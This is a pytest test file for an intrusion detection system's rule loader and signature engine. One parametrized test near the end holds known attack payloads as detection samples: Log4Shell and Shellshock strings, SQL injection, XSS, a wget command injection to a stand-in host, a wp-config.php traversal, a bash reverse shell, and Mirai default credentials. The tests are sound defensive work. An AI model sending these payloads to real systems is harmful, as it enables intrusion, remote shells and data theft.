"""Unit tests for the rule loader and the signature engine."""
import json

import pytest

from ids.engine import Engine
from ids.rules import Rule, RuleError, RuleSet


def load_rules(tmp_path, rules):
    p = tmp_path / "rules.json"
    p.write_text(json.dumps({"rules": rules}), encoding="utf-8")
    return RuleSet.load(p)


def test_content_match_nocase(tmp_path):
    rs = load_rules(tmp_path, [{
        "id": "T1", "name": "test", "protocol": "tcp",
        "content": "EVIL", "nocase": True,
    }])
    eng = Engine(rs)
    assert eng.evaluate("tcp", 1000, 80, b"xx evil xx")
    assert not eng.evaluate("tcp", 1000, 80, b"benign")
    assert not eng.evaluate("udp", 1000, 80, b"xx evil xx")  # wrong proto


def test_hex_and_regex_match(tmp_path):
    rs = load_rules(tmp_path, [
        {"id": "HEX", "name": "hex", "content_hex": "deadbeef"},
        {"id": "RE", "name": "re", "regex": "union\\s+select", "nocase": True},
    ])
    eng = Engine(rs)
    assert [r.id for r in eng.evaluate("tcp", 1, 2, b"\x00\xde\xad\xbe\xef")] == ["HEX"]
    assert [r.id for r in eng.evaluate("tcp", 1, 2, b"UNION  SELECT * FROM x")] == ["RE"]


def test_port_filters(tmp_path):
    rs = load_rules(tmp_path, [{
        "id": "P", "name": "port", "protocol": "tcp", "dst_port": 80, "content": "x",
    }])
    eng = Engine(rs)
    assert eng.evaluate("tcp", 1, 80, b"x")
    assert not eng.evaluate("tcp", 1, 443, b"x")


def test_header_only_rule_needs_port(tmp_path):
    # a rule with no payload condition and no ports must never fire
    rs = load_rules(tmp_path, [
        {"id": "NOPE", "name": "too broad", "protocol": "tcp"},
        {"id": "OK", "name": "port only", "protocol": "tcp", "dst_port": 4444},
    ])
    eng = Engine(rs)
    hits = eng.evaluate("tcp", 1, 4444, b"")
    assert [r.id for r in hits] == ["OK"]


def test_invalid_regex_names_rule(tmp_path):
    with pytest.raises(RuleError, match="BADRE"):
        load_rules(tmp_path, [{"id": "BADRE", "name": "x", "regex": "("}])


def test_invalid_hex_names_rule(tmp_path):
    with pytest.raises(RuleError, match="BADHEX"):
        load_rules(tmp_path, [{"id": "BADHEX", "name": "x", "content_hex": "zz"}])


def test_unknown_protocol_rejected(tmp_path):
    with pytest.raises(RuleError, match="protocol"):
        load_rules(tmp_path, [{"id": "P", "name": "x", "protocol": "gopher", "content": "a"}])


def test_duplicate_ids_rejected(tmp_path):
    with pytest.raises(RuleError, match="duplicate"):
        load_rules(tmp_path, [
            {"id": "DUP", "name": "a", "content": "a"},
            {"id": "DUP", "name": "b", "content": "b"},
        ])


def test_missing_id_rejected(tmp_path):
    with pytest.raises(RuleError, match="required"):
        load_rules(tmp_path, [{"name": "no id", "content": "a"}])


def test_engine_reload_swaps_rules(tmp_path):
    eng = Engine(load_rules(tmp_path, [{"id": "A", "name": "a", "content": "aaa"}]))
    assert eng.rule_count == 1
    eng.reload(load_rules(tmp_path, [
        {"id": "A", "name": "a", "content": "aaa"},
        {"id": "B", "name": "b", "content": "bbb"},
    ]))
    assert eng.rule_count == 2
    assert [r.id for r in eng.evaluate("tcp", 1, 2, b"bbb")] == ["B"]


def default_engine():
    from pathlib import Path
    path = Path(__file__).resolve().parent.parent / "rules" / "default.rules.json"
    return Engine(RuleSet.load(path))


def test_default_ruleset_loads():
    assert default_engine().rule_count >= 10


def test_default_ruleset_ids_unique():
    eng = default_engine()
    ids = [r.id for r in eng.ruleset.rules]
    assert len(ids) == len(set(ids))


@pytest.mark.parametrize("proto,sport,dport,payload,expected", [
    ("tcp", 5, 80, b"GET /?x=${jndi:ldap://h/a} HTTP/1.1\r\n", "EXP-LOG4SHELL-JNDI"),
    ("tcp", 5, 80, b"User-Agent: () { :;}; /bin/id\r\n", "EXP-SHELLSHOCK"),
    ("tcp", 5, 80, b"/login?u=1' or '1'='1", "WEB-SQLI-BOOLEAN"),
    ("tcp", 5, 80, b"/?id=1;sleep(5)", "WEB-SQLI-TIME"),
    ("tcp", 5, 80, b"/?q=<script>alert(1)</script>", "WEB-XSS-SCRIPT-TAG"),
    ("tcp", 5, 80, b"/?x=;wget http://evil/x", "WEB-CMD-INJECTION"),
    ("tcp", 5, 80, b"GET /../wp-config.php HTTP/1.1", "WEB-SENSITIVE-FILE"),
    ("tcp", 5, 9001, b"bash -i >& /dev/tcp/1.2.3.4/9001 0>&1", "MAL-REVERSE-SHELL"),
    ("tcp", 5, 3333, b'{"method":"mining.subscribe"}', "C2-MINING-STRATUM"),
    ("tcp", 5, 23, b"root\r\nxc3511\r\n", "MAL-MIRAI-TELNET-CREDS"),
    ("tcp", 5, 80, b"User-Agent: sqlmap/1.7\r\n", "RECON-SQLMAP-UA"),
    ("tcp", 5, 80, b"User-Agent: gobuster/3.6\r\n", "RECON-DIRBUSTER-UA"),
])
def test_default_ruleset_detects_known_attacks(proto, sport, dport, payload, expected):
    hits = {r.id for r in default_engine().evaluate(proto, sport, dport, payload)}
    assert expected in hits


def test_default_ruleset_quiet_on_benign_http():
    eng = default_engine()
    benign = b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    assert eng.evaluate("tcp", 44000, 80, benign) == []
